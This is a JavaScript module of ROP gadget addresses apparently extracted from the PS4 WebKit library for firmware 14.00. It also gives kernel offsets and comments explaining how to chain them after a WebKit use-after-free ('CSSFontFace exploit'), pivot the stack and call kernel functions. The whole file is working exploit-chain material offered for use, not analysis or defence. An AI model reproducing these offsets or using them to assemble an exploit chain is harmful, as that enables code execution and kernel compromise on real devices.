// WebKit ROP Gadgets — PS4 Firmware 14.00
// Source: libSceNKWebKit.sprx.decrypted (67 MB)
// Generated: 2026-10-23 20:52 by find_webkit_gadgets_1400.py
// Method: Byte pattern search (same methodology as 13.04/13.50)
// Author: adri22235 + H4SS9M
//
// FW 14.00 released: September 16, 2026
// Kernel offsets: see 1400_offsets.txt / 1400.c

const webkit_gadgets_1400 = {
  wk_RET                        : 0x4032,    // ret (249368 found, pattern: c3)
  wk_LEAVE_RET                  : 0x1c2f7,    // leave; ret (94 found, pattern: c9c3)
  wk_POP_RAX_RET                : 0x14504,    // pop rax; ret (459 found, pattern: 58c3)
  wk_POP_RBX_RET                : 0xb9e8,    // pop rbx; ret (432 found, pattern: 5bc3)
  wk_POP_RCX_RET                : 0x1fade,    // pop rcx; ret (238 found, pattern: 59c3)
  wk_POP_RDX_RET                : 0x1305ba,    // pop rdx; ret (77 found, pattern: 5ac3)
  wk_POP_RSI_RET                : 0x7245e,    // pop rsi; ret (235 found, pattern: 5ec3)
  wk_POP_RDI_RET                : 0x60480,    // pop rdi; ret (158 found, pattern: 5fc3)
  wk_POP_RBP_RET                : 0x40b6,    // pop rbp; ret (92843 found, pattern: 5dc3)
  wk_POP_RSP_RET                : 0x73017,    // pop rsp; ret (261 found, pattern: 5cc3)
  wk_POP_R8_RET                 : 0x230cbe1,    // pop r8; ret (1 found, pattern: 4158c3)
  wk_POP_R12_RET                : 0x242ab15,    // pop r12; ret (1 found, pattern: 415cc3)
  wk_POP_R14_RET                : 0xa9e91,    // pop r14; ret (98 found, pattern: 415ec3)
  wk_POP_R15_RET                : 0x6047f,    // pop r15; ret (41 found, pattern: 415fc3)
  wk_MOV_RAX_RDI_RET            : 0x23320,    // mov rax, rdi; ret (217 found, pattern: 4889f8c3)
  wk_MOV_RDX_RAX_RET            : 0x1ceba9,    // mov rdx, rax; ret (5 found, pattern: 4889c2c3)
  wk_XCHG_RAX_RSP_RET           : 0x3f755a8,    // xchg rax, rsp; ret (stack pivot!) (1 found, pattern: 4894c3)
  wk_MOV_QWORD_RDI_RAX_RET      : 0x948b,    // mov [rdi], rax; ret (write primitive) (274 found, pattern: 488907c3)
  wk_MOV_RAX_QWORD_RAX_RET      : 0x14021,    // mov rax, [rax]; ret (read primitive) (129 found, pattern: 488b00c3)
  wk_MOV_RAX_QWORD_RDI_RET      : 0xe2ea0,    // mov rax, [rdi]; ret (read primitive) (27 found, pattern: 488b07c3)
  wk_ADD_RAX_RCX_RET            : 0x84f67,    // add rax, rcx; ret (105 found, pattern: 4801c8c3)
  wk_SUB_RAX_RCX_RET            : 0x98736c,    // sub rax, rcx; ret (2 found, pattern: 4829c8c3)
  wk_XOR_RAX_RAX_RET            : 0x23d14f6,    // xor rax, rax; ret (zero rax) (1 found, pattern: 4831c0c3)
  wk_INC_RAX_RET                : 0xc5e51c,    // inc rax; ret (3 found, pattern: 48ffc0c3)
  wk_JMP_RAX                    : 0x4082,    // jmp rax (3130 found, pattern: ffe0)
  wk_CALL_RAX                   : 0x4041,    // call rax (1198 found, pattern: ffd0)
  wk_JMP_RCX                    : 0x12a2a,    // jmp rcx (1475 found, pattern: ffe1)

  // Compound gadgets (multi-pop chains)
  wk_POP_R13_POP_R14_POP_R15_RET: 0x6047b,    // pop r13; pop r14; pop r15; ret
  wk_POP_RBX_POP_RBP_RET        : 0xad0f,    // pop rbx; pop rbp; ret
};

// Kernel offsets for 14.00 (from 1400_offsets.txt):
// PRISON0    = 0x0111FA18  (unchanged from 13.04)
// ROOTVNODE  = 0x02136E90  (unchanged from 13.04)
// ALLPROC    = 0x01B28538
// SYSENT     = 0x01102B70

// Usage with CSSFontFace exploit:
//   1. Load this file in your exploit HTML page
//   2. Use gadgets to build ROP chain after WebKit UAF trigger
//   3. Pivot stack with wk_XCHG_RAX_RSP_RET
//   4. Chain: set up args -> call kernel function -> profit
//
// Comparison methodology:
//   - BinDiff webkit_gadgets_1350.js addresses against these
//   - Delta analysis shows offset shifts between FW versions
//   - If a gadget moved, check alternative occurrences in .all array

module.exports = { webkit_gadgets_1400 };
